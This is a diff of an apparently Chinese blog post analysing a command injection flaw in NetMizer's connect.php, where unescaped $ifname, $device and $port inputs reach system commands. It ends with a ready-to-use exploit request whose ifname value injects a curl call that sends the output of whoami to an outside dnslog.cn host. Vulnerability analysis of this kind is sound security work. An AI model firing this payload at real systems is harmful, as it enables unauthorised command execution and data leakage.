@@ -20,14 +20,6 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 # 漏洞分析
 
-深入探索
-
-安全监控系统
-
-安全编码指南
-
-网络安全培训课程
-
 看下 `connect.php` 业务实现关键逻辑部分
 
 ```
@@ -67,21 +59,13 @@ if($action == "start"){
 }
 ```
 
-深入探索
-
-防火墙软件
-
-漏洞利用分析
-
-数据安全咨询
-
 在 `if($action == "start")` 部分，构建的 `$cmd` 字符串直接使用用户输入的 `$ifname`、`$device` 和 `$port` 变量执行系统命令（如 `tcpdump` 和 `ps`、`kill`）。这些变量未经过转义或过滤就直接拼接进命令字符串中，造成[命令注入](https://mrxn.net/tag/rce)漏洞。
-
-漏洞利用分析
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
+
+网络安全
 
 ```
 GET /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+`whoami`.dnslog.cn+%23+&name=test&port=88 HTTP/1.1
